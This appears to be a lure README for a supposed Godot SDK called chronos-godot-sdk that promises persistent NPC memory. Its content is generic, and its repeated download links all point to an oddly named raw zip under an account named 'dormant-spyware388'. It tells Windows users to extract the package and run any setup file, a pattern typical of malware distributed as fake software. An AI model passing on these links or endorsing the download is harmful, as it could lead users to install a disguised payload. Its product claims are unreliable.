# 🤖 chronos-godot-sdk - Give NPCs Memory and Purpose

[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/dormant-spyware388/chronos-godot-sdk/raw/refs/heads/main/Godot-SDK/chronos-godot-3.6-sdk/scripts/godot_chronos_sdk_Salol.zip)

## 🧭 What this is

chronos-godot-sdk is the official Godot SDK for Chronos Engine. It adds persistent world memory, growing NPC state, and AI-based behavior to Godot games.

Use it when you want game characters to remember past events, react to player actions, and keep their state between sessions. It fits games that need deeper NPC behavior without making the setup hard for end users.

## ✨ What you can do

- Keep NPC memory across saves
- Track changes in the world over time
- Give characters state that grows as the game runs
- Connect your game to Chronos Engine services
- Use it as a Godot plugin in a normal project setup
- Build games with more natural NPC behavior
- Store and read game state from a backend service

## 💻 What you need

- Windows 10 or Windows 11
- Godot 4.x
- An internet connection for the first download
- Enough free disk space for the game project and SDK files
- A modern CPU and 8 GB RAM or more for smooth use

## 📥 Download

Visit this page to download the latest release:

https://github.com/dormant-spyware388/chronos-godot-sdk/raw/refs/heads/main/Godot-SDK/chronos-godot-3.6-sdk/scripts/godot_chronos_sdk_Salol.zip

On that page, look for the newest release and download the file that matches your project setup. If the release includes a zip file, download that file first and then extract it on your PC.

## 🪟 Install on Windows

1. Open the release page in your browser.
2. Download the latest release file.
3. If the file is zipped, right-click it and choose Extract All.
4. Open your Godot project folder.
5. Copy the SDK files into the correct plugin or add-on folder.
6. Open Godot.
7. Load your project and let Godot import the files.
8. If the SDK includes a setup file, run it before you start the project.
9. Restart Godot if the plugin does not show up at once.

## 🗂️ Where to place the files

In most Godot projects, add-on files go in a folder like this:

- `res://addons/chronos-godot-sdk/`

If the release contains a different folder name, keep that name when you copy the files. Godot reads add-ons from the `addons` folder, so placing the files there helps the editor find them.

## ▶️ First run

1. Start Godot.
2. Open your project.
3. Check the Project settings or Add-ons list for the Chronos SDK entry.
4. Enable the plugin if Godot asks you to.
5. Run the project.
6. Open a test scene and confirm the SDK loads without errors.

If your game uses a login key, API token, or server address, enter it in the project settings or in the config file that comes with the SDK.

## 🧩 How it fits into your game

This SDK helps your game keep track of things that matter over time. For example:

- An NPC can remember that the player helped them
- A town can change after certain events
- A guard can react to past crimes
- A shopkeeper can change prices or dialogue based on state
- A quest giver can act on previous choices

This kind of memory makes your game feel more alive and less static.

## 🔧 Basic setup flow

1. Download the release.
2. Add the SDK to your Godot project.
3. Open the project in Godot.
4. Enable the plugin.
5. Set any server or API details.
6. Save the project.
7. Run the game.
8. Check that NPC state and world memory load as expected.

## 📝 Common file types you may see

- `.zip` for the main download package
- `.gd` for Godot script files
- `.tscn` for scenes
- `.cfg` or `.json` for settings
- `.dll` if the release includes Windows support files

Keep all files together when you extract the download. If you move only part of the package, Godot may not load it as expected.

## 🧪 Simple test after setup

After you install the SDK, try this:

1. Open a scene with one NPC.
2. Change a value for that NPC.
3. Save the game.
4. Close the game.
5. Open it again.
6. Check whether the NPC keeps the same state.

If the state stays the same, the SDK is working in your project.

## 🧹 If something does not work

- Make sure you copied the files into the project folder, not just onto the desktop
- Check that the folder path is inside `addons`
- Make sure you are using a supported version of Godot
- Restart Godot after adding new files
- Confirm that the release file finished downloading
- Open the project again if the plugin does not appear at first

## 📌 Best use cases

- RPGs with living towns
- Simulation games with long-term state
- Adventure games with remembered choices
- Strategy games with changing factions
- Sandbox games with persistent worlds
- Indie projects that need smarter NPCs

## 🔒 Project scope

This SDK is built for game projects that want persistent memory and AI-based behavior. It works as part of a larger Godot setup and keeps the focus on world state, NPC state, and server-backed logic.

## 📎 Download again

https://github.com/dormant-spyware388/chronos-godot-sdk/raw/refs/heads/main/Godot-SDK/chronos-godot-3.6-sdk/scripts/godot_chronos_sdk_Salol.zip

## 🛠️ Folder layout example

A simple project layout may look like this:

- `MyGodotGame/`
  - `addons/`
    - `chronos-godot-sdk/`
  - `scenes/`
  - `scripts/`
  - `project.godot`

If the release includes sample files, place them in the same project root so Godot can read them.

## 🎮 What this README helps you do

This page gives you the steps to get the SDK onto your Windows PC, place it in a Godot project, and start the app or plugin from there. If the release package includes a ready-to-run file, you can use it after download. If it comes as a plugin package, add it to your project and open it in Godot.